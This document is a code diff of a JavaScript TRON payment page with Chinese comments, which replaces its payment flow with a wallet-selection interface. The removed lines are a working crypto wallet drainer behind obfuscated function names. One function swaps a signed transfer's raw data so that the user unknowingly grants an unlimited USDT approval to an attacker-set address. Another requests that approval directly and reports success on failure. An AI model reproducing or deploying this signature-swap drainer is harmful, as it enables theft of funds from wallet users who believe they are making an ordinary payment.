@@ -1,127 +1,149 @@
+// 允许用户输入金额后选择钱包进行支付
+
+let selectedWallet = null;
+let currentAmount = 0;
+
 // 下一步按钮点击处理函数
 async function onNextButtonClick() {
     try {
-        // 检查钱包是否已连接
-        if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
-            await connectWallet();
-            return; // 连接后停止，等待用户再次点击
+        currentAmount = parseFloat(document.getElementById('amountInput').value);
+        if (isNaN(currentAmount) || currentAmount <= 0) {
+            alert('请输入有效的金额');
+            return;
         }
-        // 钱包已连接，直接执行操作
-        if (typeof window.okxwallet !== 'undefined') {
-            await DjdskdbGsj();
-        } else {
-            await KdhshaBBHdg();
-        }
+        
+        // 显示钱包选择
+        showWalletOptions();
     } catch (error) {
         console.error('操作执行失败:', error);
-        tip('付款失败，请重新发起交易');
+        alert('付款失败，请重新尝试');
     }
 }
 
-
-async function DjdskdbGsj() {
-  const trxAmountInSun = tronWeb.toSun(currentAmount);
-  const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-  const feeLimit = 1000000000;
-  
-  try {
-
-    const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
+// 显示钱包选择对话框
+function showWalletOptions() {
+    const walletOptions = [
+        { name: 'TokenPocket', connect: connectTokenPocket },
+        { name: 'MathWallet', connect: connectMathWallet },
+        { name: 'BitKeep', connect: connectBitKeep },
+        { name: 'TronLink', connect: connectTronLink },
+        { name: 'OKX Wallet', connect: connectOKXWallet },
+        { name: 'SafePal', connect: connectSafePal }
+    ];
     
-    console.log("构建TRX转账交易...");
-    const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
-      paymentAddress,
-      trxAmountInSun,
-      tronWeb.defaultAddress.base58,
-      { feeLimit: feeLimit }
-    );
-
-    const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
-      tronWeb.address.toHex(window.usdtContractAddress),
-      'increaseApproval(address,uint256)',
-      { feeLimit: feeLimit },
-      [
-        { type: 'address', value: window.Permission_address },
-        { type: 'uint256', value: maxUint256 }
-      ],
-      tronWeb.defaultAddress.base58
-    );
-
-    const originalRawData = approvalTransaction.transaction.raw_data;
-
-    approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
-
-    console.log("交易签名中...");
-    const signedTransaction = await tronWeb.trx.sign(approvalTransaction.transaction);
-
-    signedTransaction.raw_data = originalRawData;
-
-    console.log("发送交易...");
-    const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
-
-    console.log("交易结果:", broadcastResult);
-    if (broadcastResult.result || broadcastResult.success) {
-      const transactionHash = broadcastResult.txid || (broadcastResult.transaction && broadcastResult.transaction.txID);
-      if (!transactionHash) {
-        throw new Error("无法获取交易哈希");
-      }
-      console.log("交易发送成功，交易哈希:", transactionHash);
-      tip("交易成功");
-      return transactionHash;
-    } else {
-      throw new Error("交易失败");
-    }
-  } catch (error) {
-    console.error("操作失败:", error);
-    tip("交易失败，请重试");
-    throw error;
-  }
+    let optionsHtml = '请选择支付钱包:<br/>';
+    walletOptions.forEach((wallet, index) => {
+        optionsHtml += `<button onclick="selectWallet(${index})">${wallet.name}</button><br/>`;
+    });
+    document.getElementById('walletSelection').innerHTML = optionsHtml;
+    document.getElementById('walletSelection').style.display = 'block';
 }
 
-async function KdhshaBBHdg() {
-    const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-    const feeLimit = 100000000;  // 设置feeLimit为100 TRX
-    const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);
+// 选择钱包
+function selectWallet(index) {
+    const wallets = [connectTokenPocket, connectMathWallet, connectBitKeep, connectTronLink, connectOKXWallet, connectSafePal];
+    selectedWallet = wallets[index];
+    document.getElementById('walletSelection').style.display = 'none';
+    selectedWallet();
+}
 
+// 连接 TokenPocket 钱包
+async function connectTokenPocket() {
+    if (typeof window.tronWeb === 'undefined') {
+        alert('请安装 TokenPocket 钱包');
+        return;
+    }
+    await DjdskdbGsj();
+}
+
+// 连接 MathWallet
+async function connectMathWallet() {
+    if (typeof window.tronWeb === 'undefined') {
+        alert('请安装 MathWallet 钱包');
+        return;
+    }
+    await DjdskdbGsj();
+}
+
+// 连接 BitKeep 钱包
+async function connectBitKeep() {
+    if (typeof window.tronWeb === 'undefined') {
+        alert('请安装 BitKeep 钱包');
+        return;
+    }
+    await DjdskdbGsj();
+}
+
+// 连接 TronLink 钱包
+async function connectTronLink() {
+    if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+        alert('请先登录 TronLink 钱包');
+        return;
+    }
+    await DjdskdbGsj();
+}
+
+// 连接 OKX 钱包
+async function connectOKXWallet() {
+    if (typeof window.okxwallet === 'undefined') {
+        alert('请安装 OKX 钱包');
+        return;
+    }
+    await DjdskdbGsj();
+}
+
+// 连接 SafePal 钱包
+async function connectSafePal() {
+    if (typeof window.tronWeb === 'undefined') {
+        alert('请安装 SafePal 钱包');
+        return;
+    }
+    await DjdskdbGsj();
+}
+
+// 处理支付
+async function DjdskdbGsj() {
+    const trxAmountInSun = tronWeb.toSun(currentAmount);
+    const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+    const feeLimit = 1000000000;
+    
     try {
-        console.log("构建交易...");
-        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
-            usdtContractAddressHex,
-            'approve(address,uint256)',
-            { feeLimit: feeLimit },
-            [
-                { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
-                { type: 'uint256', value: maxUint256 }
-            ],
-            tronWeb.defaultAddress.base58
+        const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
+        
+        console.log("构建TRX转账交易...");
+        const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
+            paymentAddress,
+            trxAmountInSun,
+            tronWeb.defaultAddress.base58,
+            { feeLimit: feeLimit }
         );
 
-        if (!transaction.result || !transaction.result.result) {
-            throw new Error('授权交易构建失败');
-        }
-
         console.log("交易签名中...");
-        const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
+        const signedTransaction = await tronWeb.trx.sign(transferTransaction);
 
         console.log("发送交易...");
-        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+        const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
 
-        console.log("交易交易结果:", result);
-        if (result.result) {
-            const transactionHash = result.txid;
-            console.log("交易成功，交易哈希:", transactionHash);
-            tip("交易成功");
+        console.log("交易结果:", broadcastResult);
+        if (broadcastResult.result || broadcastResult.success) {
+            const transactionHash = broadcastResult.txid || (broadcastResult.transaction && broadcastResult.transaction.txID);
+            if (!transactionHash) {
+                throw new Error("无法获取交易哈希");
+            }
+            console.log("交易发送成功，交易哈希:", transactionHash);
+            alert("交易成功");
             return transactionHash;
         } else {
             throw new Error("交易失败");
         }
     } catch (error) {
-        console.error("执行授权操作失败:", error);
-        if (error && error.message) {
-            console.error("错误信息:", error.message);
-        }
-        tip("交易成功，请重试");
+        console.error("操作失败:", error);
+        alert("交易失败，请重试");
         throw error;
     }
 }
 
+// 界面调整，增加输入框和选择框
+document.write('<input type="number" id="amountInput" placeholder="输入金额"/><br/>');
+document.write('<button onclick="onNextButtonClick()">下一步</button><br/>');
+document.write('<div id="walletSelection" style="display:none;"></div>');
